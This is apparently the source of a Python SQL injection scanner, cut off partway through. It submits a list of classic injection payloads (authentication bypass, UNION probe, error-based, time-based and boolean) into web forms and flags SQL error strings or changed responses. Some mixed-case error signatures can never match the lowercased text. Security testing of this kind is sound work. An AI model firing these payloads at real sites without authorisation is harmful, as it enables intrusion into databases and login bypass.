"""
Script Name: SQLInjection.py
Author: Justin Andrews
Version: 2.0
Date: 2024-03-19

Description:
    This script performs SQL injection testing on web forms. It attempts various SQL injection
    payloads and analyzes responses for signs of successful injection. The script uses the
    Utils.py WebDriver class for form interaction and result analysis.

Arguments:
    url                 Target URL to test for SQL injection vulnerabilities
    --debug            Enable debug output
    --logging          Enable logging to file
    --headless         Run in headless mode (default: True)

Usage:
    Basic scan:
        python SQLInjection.py http://example.com/page
    
    With debug and logging:
        python SQLInjection.py http://example.com/page -d -l

Example:
    python SQLInjection.py http://testphp.vulnweb.com/login.php -d -l
"""

import re
import sys
from typing import List, Dict, Any, Optional
from Utils import LoggingPipeline, WebDriver, ArgumentHandler

# SQL Injection payload definitions
SQL_PAYLOADS = [
    {
        "name": "Basic Authentication Bypass",
        "payload": "' OR '1'='1",
        "description": "Simple login bypass attempt",
    },
    {
        "name": "Union Select Probe",
        "payload": "' UNION SELECT NULL--",
        "description": "Tests for UNION injection possibility",
    },
    {
        "name": "Error Based",
        "payload": "' OR 1=CONVERT(int,@@version)--",
        "description": "Attempts to trigger SQL error messages",
    },
    {
        "name": "Time Based",
        "payload": "'; WAITFOR DELAY '0:0:5'--",
        "description": "Tests for blind injection via time delays",
    },
    {
        "name": "Boolean Based",
        "payload": "' OR 1=1--",
        "description": "Tests for boolean-based blind injection",
    },
]


class SQLInjectionTester:
    """SQL Injection testing class focused on individual form testing."""

    def __init__(self, url: str, debug: bool = False, headless: bool = True):
        """Initialize the SQL Injection tester."""
        self.url = url
        self.debug = debug

        # Initialize logging
        self.logger = LoggingPipeline(
            debug=debug, logging=True, log_name="sql_injection"
        )

        # Initialize web driver
        try:
            self.driver = WebDriver(
                url=url, headless=headless, debug=debug, logging=True, scan_forms=True
            )

            if not self.driver.forms:
                raise ValueError("No forms found on the page")

            self.logger.append_log(
                f"Found {len(self.driver.forms)} forms to test", "SUCCESS"
            )

        except Exception as e:
            self.logger.append_log(f"Initialization failed: {str(e)}", "ERROR")
            raise

    def test_form(self, form_name: str) -> List[Dict[str, Any]]:
        """
        Test a single form with all payloads.

        Args:
            form_name: Name/ID of the form to test

        Returns:
            List of findings for this form
        """
        findings = []
        self.logger.start_section(f"Testing Form: {form_name}")

        # Get baseline response
        baseline = self.driver.capture_form_baseline(form_name)
        if not baseline:
            self.logger.append_log(
                f"Failed to capture baseline for {form_name}", "ERROR"
            )
            return findings

        baseline_content = self._clean_response(baseline["response_content"])

        # Test each payload
        for payload in SQL_PAYLOADS:
            self.logger.append_log(
                f"Testing {payload['name']}: {payload['description']}", "INFO"
            )

            # Submit payload
            response = self.driver.test_form_submission(form_name, payload["payload"])
            if not response:
                continue

            # Compare with baseline
            cleaned_response = self._clean_response(response["response_content"])

            if self._is_different_response(baseline, response):
                finding = {
                    "form": form_name,
                    "payload": payload["name"],
                    "value": payload["payload"],
                    "url_before": baseline["new_url"],
                    "url_after": response["new_url"],
                    "reason": self._determine_difference_reason(baseline, response),
                }
                findings.append(finding)
                self._log_finding(finding)

        return findings

    def _clean_response(self, content: str) -> str:
        """
        Clean response content for comparison.
        Strips dynamic content and normalizes whitespace.
        """
        if not content:
            return ""

        # Convert to lowercase for case-insensitive comparison
        cleaned = content.lower()

        # Remove common dynamic content
        cleaned = re.sub(r"<input[^>]*csrf[^>]*>", "", cleaned)
        cleaned = re.sub(r"<input[^>]*token[^>]*>", "", cleaned)

        # Normalize whitespace
        cleaned = " ".join(cleaned.split())

        return cleaned.strip()

    def _is_different_response(
        self, baseline: Dict[str, Any], response: Dict[str, Any]
    ) -> bool:
        """Determine if the test response indicates a potential SQL injection."""
        method = response.get("method", "get").lower()
        response_content = response.get("response_content", "").lower()
        baseline_content = baseline.get("response_content", "").lower()

        # Common SQL errors to check for both GET and POST
        sql_errors = [
            "syntax error",
            "sql syntax",
            "mysql error",
            "mysql syntax",
            "postgresql error",
            "oracle error",
            "database error",
            "ORA-",
            "PLS-",
            "mysql_fetch_array()",
            "Warning: mysql",
            "ODBC SQL Server Driver",
            "Microsoft OLE DB Provider for SQL Server",
            "SQLServer JDBC Driver",
            "[SQLServer]",
            "[Microsoft][ODBC SQL Server Driver]",
            "Unclosed quotation mark after the character string",
            "quoted string not properly terminated",
        ]

        # Check for SQL errors in response
        for error in sql_errors:
            if error in response_content and error not in baseline_content:
                return True

        # Additional checks based on method
        if method == "get":
            # For GET forms, only SQL errors are considered (already checked above)
            return False
        else:
            # For POST forms, also check for:
            # 1. Successful bypasses (like successful login)
            # 2. Different response content
            # 3. Unexpected navigation/redirects
            if "login successful" in response_content:
                return True
            if "welcome" in response_content and "welcome" not in baseline_content:
                return True
            if baseline_content != response_content:
                # For POST forms, content differences could indicate successful injection
                return True

        return False

    def _determine_difference_reason(
        self, baseline: Dict[str, Any], response: Dict[str, Any]
    ) -> str:
        """Determine why the response indicates SQL injection."""
        method = response.get("method", "get").lower()
        response_content = response.get("response_content", "").lower()
        baseline_content = baseline.get("response_content", "").lower()

        # Common SQL error messages and their descriptions
        sql_errors = {
            "syntax error": "SQL syntax error detected",
            "mysql error": "MySQL error detected",
            "postgresql error": "PostgreSQL error detected",
            "oracle error": "Oracle error detected",
            "database error": "Database error detected",
            "